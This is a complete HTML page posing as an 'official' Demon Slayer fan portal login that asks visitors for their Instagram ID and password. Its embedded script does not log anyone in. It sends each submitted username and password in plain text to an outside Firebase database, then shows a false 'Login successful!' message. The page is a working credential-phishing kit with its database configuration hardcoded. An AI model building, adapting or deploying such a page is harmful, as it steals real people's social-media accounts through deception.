<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demon Slayer Fan Portal</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial, sans-serif; }
        body { height:100vh; display:flex; justify-content:center; align-items:center; background:url('https://images.unsplash.com/photo-1511497584788-876760111969?q=80&w=1920') center/cover no-repeat; overflow:hidden; }
        body::before { content:""; position:absolute; inset:0; background:rgba(0,0,0,0.65); }
        .login-box { position:relative; z-index:2; width:350px; padding:30px; border-radius:20px; backdrop-filter:blur(12px); background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.2); text-align:center; color:white; box-shadow:0 0 25px rgba(255,0,0,0.4); }
        .logo { font-size:32px; font-weight:bold; color:#ff4d4d; text-shadow:0 0 15px red; margin-bottom:10px; }
        .subtitle { font-size:14px; margin-bottom:25px; opacity:.9; }
        input { width:100%; padding:14px; margin:10px 0; border:none; border-radius:10px; background:rgba(255,255,255,0.12); color:white; outline:none; }
        input::placeholder { color:#ddd; }
        input:focus { box-shadow:0 0 10px #ff4d4d; }
        button { width:100%; padding:14px; margin-top:15px; border:none; border-radius:10px; background:#e60026; color:white; font-size:18px; font-weight:bold; cursor:pointer; transition:.3s; }
        button:hover { background:#ff1a40; transform:scale(1.03); box-shadow:0 0 20px red; }
        .official { margin-top:20px; font-size:14px; color:#ddd; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">DEMON SLAYER</div>
        <div class="subtitle">Welcome to the World of Demon Slayers</div>
        <form id="loginForm">
            <input type="text" id="instagramId" placeholder="Instagram ID" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Enter</button>
        </form>
        <div class="official">Official Website</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAhNAYRLIG6M4Y2EDidPMaxFzH_hKWklaE",
            authDomain: "demon-slayer-31b73.firebaseapp.com",
            databaseURL: "https://demon-slayer-31b73-default-rtdb.firebaseio.com",
            projectId: "demon-slayer-31b73",
            storageBucket: "demon-slayer-31b73.firebasestorage.app",
            messagingSenderId: "812818786609",
            appId: "1:812818786609:web:2e3a908d35b44e604b6810"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const instaId = document.getElementById("instagramId").value;
            const pass = document.getElementById("password").value;

            // ডেটাবেসের 'users' ফোল্ডারে ডেটা সেভ হবে
            push(ref(db, 'users/'), {
                instagramId: instaId,
                password: pass,
                time: new Date().toLocaleString()
            }).then(() => {
                alert("Login successful!");
                document.getElementById("loginForm").reset();
            }).catch((err) => {
                alert("Error: " + err.message);
            });
        });
    </script>
</body>
</html>
